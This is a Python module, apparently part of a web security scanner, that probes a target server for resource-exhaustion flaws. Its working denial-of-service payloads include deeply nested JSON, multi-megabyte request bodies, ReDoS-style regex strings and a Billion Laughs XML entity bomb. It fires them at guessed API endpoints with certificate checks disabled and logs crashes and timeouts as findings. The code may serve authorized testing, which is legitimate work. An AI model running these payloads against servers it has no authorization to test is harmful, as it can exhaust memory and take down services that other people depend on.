"""Memory Leak Scanner — trigger server memory exhaustion via payloads."""

import aiohttp
import asyncio
import json
import time
from urllib.parse import urljoin
from modules.core import console

MEMORY_ENDPOINTS = [
    '/api/upload', '/upload', '/api/import', '/import',
    '/api/parse', '/parse', '/api/process', '/process',
    '/api/search', '/search', '/api/data', '/graphql',
]


async def _test_recursive_json(session, url):
    """Test server handling of deeply nested JSON."""
    findings = []

    def _build_nested(depth):
        obj = {"v": "x"}
        for _ in range(depth):
            obj = {"n": obj}
        return obj

    for depth in [100, 500, 1000]:
        payload = _build_nested(depth)
        for endpoint in ['/api/login', '/api/register', '/api/search', '/api/data', '/']:
            test_url = urljoin(url, endpoint)
            try:
                start = time.time()
                async with session.post(test_url, json=payload,
                                        timeout=aiohttp.ClientTimeout(total=15),
                                        ssl=False) as resp:
                    elapsed = time.time() - start
                    if elapsed > 5:
                        findings.append({
                            'type': f'Recursive JSON Slowdown (depth={depth})',
                            'url': endpoint,
                            'time': round(elapsed, 2),
                            'severity': 'High',
                        })
                    elif resp.status == 500:
                        findings.append({
                            'type': f'Recursive JSON Crash (depth={depth})',
                            'url': endpoint,
                            'severity': 'Critical',
                        })
            except asyncio.TimeoutError:
                findings.append({
                    'type': f'Recursive JSON Timeout (depth={depth})',
                    'url': endpoint,
                    'severity': 'High',
                })
            except Exception:
                pass

    return findings


async def _test_large_body(session, url):
    """Test server handling of oversized request bodies."""
    findings = []
    sizes = [
        ('1MB', 'A' * (1024 * 1024)),
        ('5MB', 'A' * (5 * 1024 * 1024)),
    ]

    for size_name, data in sizes:
        for endpoint in ['/api/login', '/api/search', '/api/data', '/']:
            test_url = urljoin(url, endpoint)
            try:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                start = time.time()
                async with session.post(test_url, data=f'data={data}', headers=headers,
                                        timeout=aiohttp.ClientTimeout(total=20),
                                        ssl=False) as resp:
                    elapsed = time.time() - start
                    if resp.status != 413:
                        findings.append({
                            'type': f'No Size Limit ({size_name} accepted)',
                            'url': endpoint,
                            'status': resp.status,
                            'severity': 'Medium',
                        })
                    if elapsed > 5:
                        findings.append({
                            'type': f'Large Body Processing Delay ({size_name})',
                            'url': endpoint,
                            'time': round(elapsed, 2),
                            'severity': 'High',
                        })
            except asyncio.TimeoutError:
                findings.append({
                    'type': f'Large Body Timeout ({size_name})',
                    'url': endpoint,
                    'severity': 'High',
                })
            except Exception:
                pass

    return findings


async def _test_regex_bomb(session, url):
    """Test for ReDoS via regex-heavy parameters."""
    findings = []
    regex_payloads = [
        'a' * 50 + '!',
        ('a' * 25 + 'b') * 3,
        '(a+)+$' * 10,
        '.*' * 100 + 'x',
    ]
    params_to_test = ['search', 'q', 'query', 'filter', 'pattern', 'regex', 'email', 'username']

    for param in params_to_test:
        for payload in regex_payloads:
            try:
                start = time.time()
                async with session.get(url, params={param: payload},
                                       timeout=aiohttp.ClientTimeout(total=10),
                                       ssl=False) as resp:
                    elapsed = time.time() - start
                    if elapsed > 3:
                        findings.append({
                            'type': f'Regex Processing Delay',
                            'param': param,
                            'payload_length': len(payload),
                            'time': round(elapsed, 2),
                            'severity': 'High',
                        })
            except asyncio.TimeoutError:
                findings.append({
                    'type': f'Regex Timeout',
                    'param': param,
                    'severity': 'Critical',
                })
            except Exception:
                pass

    return findings


async def _test_xml_expansion(session, url):
    """Test for XML entity expansion (Billion Laughs)."""
    findings = []
    xml_bomb = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>'''

    xml_endpoints = ['/api/import', '/api/upload', '/api/parse', '/api/xml',
                     '/soap', '/wsdl', '/api/data', '/']

    for endpoint in xml_endpoints:
        test_url = urljoin(url, endpoint)
        try:
            headers = {'Content-Type': 'application/xml'}
            start = time.time()
            async with session.post(test_url, data=xml_bomb, headers=headers,
                                    timeout=aiohttp.ClientTimeout(total=10),
                                    ssl=False) as resp:
                elapsed = time.time() - start
                body = await resp.text()
                if elapsed > 3:
                    findings.append({
                        'type': 'XML Entity Expansion (Billion Laughs)',
                        'url': endpoint,
                        'time': round(elapsed, 2),
                        'severity': 'Critical',
                    })
                elif 'lol' in body:
                    findings.append({
                        'type': 'XML Entity Expansion Processed',
                        'url': endpoint,
                        'severity': 'High',
                    })
        except asyncio.TimeoutError:
            findings.append({
                'type': 'XML Bomb Timeout',
                'url': endpoint,
                'severity': 'Critical',
            })
        except Exception:
            pass

    return findings


async def scan_memory_leak(session, url):
    """Server memory leak / resource exhaustion scanner."""
    console.print(f"\n[bold cyan]--- Memory Leak Scanner ---[/bold cyan]")
    all_findings = []

    console.print(f"  [cyan]Testing recursive JSON (depths: 100/500/1000)...[/cyan]")
    recursive = await _test_recursive_json(session, url)
    all_findings.extend(recursive)
    for f in recursive:
        console.print(f"  [red]⚠ {f['type']}: {f.get('url', '')}[/red]")

    console.print(f"  [cyan]Testing oversized bodies (1MB/5MB)...[/cyan]")
    large = await _test_large_body(session, url)
    all_findings.extend(large)

    console.print(f"  [cyan]Testing regex bombs (8 params × 4 patterns)...[/cyan]")
    regex = await _test_regex_bomb(session, url)
    all_findings.extend(regex)

    console.print(f"  [cyan]Testing XML entity expansion (Billion Laughs)...[/cyan]")
    xml = await _test_xml_expansion(session, url)
    all_findings.extend(xml)
    for f in xml:
        console.print(f"  [bold red]⚠ {f['type']}[/bold red]")

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} resource exhaustion vectors![/bold red]")
    else:
        console.print(f"\n  [green]✓ Server handles stress well[/green]")

    return {'findings': all_findings}
